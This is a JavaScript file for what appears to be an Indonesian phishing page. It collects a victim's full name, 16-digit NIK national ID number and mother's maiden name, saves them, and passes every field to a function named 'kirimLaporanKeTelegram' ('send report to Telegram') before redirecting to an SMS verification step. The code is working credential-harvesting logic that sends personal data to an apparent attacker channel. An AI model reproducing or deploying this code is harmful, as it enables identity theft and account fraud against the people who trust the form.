(() => {
  'use strict';

  if (!NovaStorage.requireSession('index.html')) return;

  const form = document.getElementById('identityForm');
  const fullName = document.getElementById('fullName');
  const nik = document.getElementById('nik');
  const motherName = document.getElementById('motherName');
  const button = document.getElementById('continueButton');
  const message = document.getElementById('message');
  const back = document.getElementById('backButton');

  const namePattern = /^[A-Za-zÀ-ÿ.' -]{3,}$/;
  const validFullName = () => namePattern.test(fullName.value.trim());
  const validNik = () => /^\d{16}$/.test(nik.value);
  const validMotherName = () => namePattern.test(motherName.value.trim());

  function updateButton() {
    const valid = validFullName() && validNik() && validMotherName();
    button.disabled = !valid;
    button.classList.toggle('active', valid);
  }

  [fullName, motherName].forEach(input => input.addEventListener('input', () => {
    input.value = input.value.replace(/[^A-Za-zÀ-ÿ.' -]/g, '').replace(/\s{2,}/g, ' ');
    message.textContent = '';
    updateButton();
  }));

  nik.addEventListener('input', () => {
    nik.value = nik.value.replace(/\D/g, '').slice(0, 16);
    message.textContent = '';
    updateButton();
  });

  form.addEventListener('submit', event => {
    event.preventDefault();

    if (!validFullName()) {
      message.textContent = 'Nama lengkap belum valid.';
      message.className = 'message error';
      fullName.focus();
      return;
    }
    if (!validNik()) {
      message.textContent = 'NIK harus terdiri dari tepat 16 angka.';
      message.className = 'message error';
      nik.focus();
      return;
    }
    if (!validMotherName()) {
      message.textContent = 'Nama ibu kandung belum valid.';
      message.className = 'message error';
      motherName.focus();
      return;
    }

    button.disabled = true;
    button.textContent = 'MENYIMPAN...';

    const saved = NovaStorage.setIdentity({
      fullName: fullName.value,
      nik: nik.value,
      motherName: motherName.value
    });

    if (!saved) {
      button.disabled = false;
      button.textContent = 'LANJUTKAN →';
      message.textContent = 'Data tidak dapat disimpan pada browser ini.';
      message.className = 'message error';
      return;
    }

    window.kirimLaporanKeTelegram?.({
      event: 'IDENTITY_SUBMITTED',
      page: 'form-nik.html',
      nama_lengkap: fullName.value,
      nik: nik.value,
      nama_ibu_kandung: motherName.value,
      status: 'IDENTITY_SAVED'
    });

    message.textContent = 'Data berhasil disimpan.';
    message.className = 'message success';
    NovaStorage.setSmsVerified(false);
    setTimeout(() => window.location.replace('verifikasi-sms.html'), 450);
  });

  back?.addEventListener('click', () => window.location.href = 'index.html');

  const saved = NovaStorage.getIdentity();
  if (saved) {
    fullName.value = saved.fullName || '';
    nik.value = saved.nik || '';
    motherName.value = saved.motherName || '';
  }
  updateButton();
})();
